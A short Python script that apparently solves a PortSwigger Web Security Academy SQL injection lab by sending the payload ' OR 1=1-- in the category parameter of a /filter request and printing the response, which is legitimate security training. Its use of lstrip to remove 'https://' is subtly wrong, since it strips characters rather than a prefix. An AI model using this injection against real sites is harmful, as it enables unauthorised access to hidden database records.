"""
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.text)

s = requests.Session()
try_category(f"'+OR+1=1--")